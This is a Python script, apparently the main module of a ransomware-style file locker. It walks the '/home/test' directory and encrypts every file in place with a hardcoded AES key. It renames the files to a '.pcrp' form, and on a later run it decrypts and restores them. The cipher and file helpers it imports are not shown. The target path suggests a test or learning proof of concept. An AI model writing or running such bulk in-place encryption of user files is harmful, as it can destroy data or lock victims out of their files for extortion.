from libs.confs import Configurations
from libs.ccm import AESCipher
from libs.discover import Discover
from libs.files import Manager
from sys import platform
from base64 import b64decode

class Main(object):
    def __init__(self):
        self.Secret = 'DtXGahSmQNT-AE2'
        self.Path = Configurations().Path[platform]
        self.Cipher = AESCipher()
        self.Manager = Manager()

    def __main__(self):
        self.Operation = 0 if 0 in [ 1 if _file.endswith('.pcrp') else 0 for _file in Discover('/home/test').__start__() ] else 1
        self.__start__()

    def __start__(self):
        """
            For OPERATION == 1 it will decrypt
            And for OPERATION == 0 it will crypt
        """
        self.Files = [ _file for _file in Discover('/home/test').__start__() ]

        if self.Operation:
            self.__dec__()

        elif not self.Operation:
            self.__enc__()

    def __enc__(self):
        for _file in self.Files:
            self.Cipher.__main__(self.Secret)
            
            try:
                self.Manager.__write__(_file, self.Cipher.__encrypt__(self.Manager.__read__(_file)))
                self.Manager.rename(_file, 0)
                print(f'SYS:INFO:ENCRYPTED: {_file}')

            except PermissionError as Error:
                print(f'SYS:ERROR: {Error}')

    def __dec__(self):
        for _file in self.Files:
            try:
                inFile = self.Manager.__read__(_file)
                
                self.Cipher.__main__(self.Secret, b64decode(inFile)[:16].decode('utf-8'))
                self.Manager.__write__(_file, self.Cipher.__decrypt__(b64decode(inFile)[-(len(b64decode(inFile)) - 16):]))
                self.Manager.rename(_file, 1)

                print(f'SYS:INFO:DECRYPTED: {_file}')

            except PermissionError as Error:
                print(f'SYS:ERROR: {Error}')
            

obj = Main()
obj.__main__()
